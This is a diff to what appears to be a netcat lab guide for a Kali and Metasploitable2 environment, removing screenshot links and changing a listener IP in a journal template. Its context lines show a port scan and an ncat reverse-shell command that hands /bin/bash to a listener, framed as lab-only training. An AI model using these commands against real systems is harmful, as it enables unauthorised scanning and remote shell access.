@@ -228,7 +228,6 @@ nc -z -v $TARGET_IP 1-1000
 
 🔍 **Output:** Shows which ports are open and responding.
 
-[📸 View Screenshot: Port Scan](screenshots/port_scan.png)
 
 ---
 
@@ -248,7 +247,6 @@ nc 192.168.56.102 4444
 
 🔍 **Result:** Type messages back and forth — confirms connectivity.
 
-- [📸 Chat Simulation](screenshots/chat_simulation.png)
 
 ---
 
@@ -277,7 +275,7 @@ sha256sum received.txt
 
 🔍 **Result:** `received.txt` should match `file.txt`.
 
-- [📸 File Transfer Result](screenshots/file_transfer.png)
+
 
 ---
 
@@ -311,7 +309,6 @@ ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
 
 🔍 **Result:** Kali gets shell access to Metasploitable2 (in lab only).
 
-- [📸 Reverse Shell Session](screenshots/reverse_shell.png)
 
 ---
 
@@ -322,7 +319,7 @@ Keep a short journal for each lab run to document what you did and why.
 Date: 2025-10-14
 Lab: Lab 1 / Lab 2 / Lab 3 / Lab 4
 Target IP: 192.168.56.102
-Listener IP: 192.168.56.101
+Listener IP: 192.168.56.103
 Ports used: 4444, 5555, ...
 Commands executed:
 - nc -z -v 192.168.56.102 1-1000
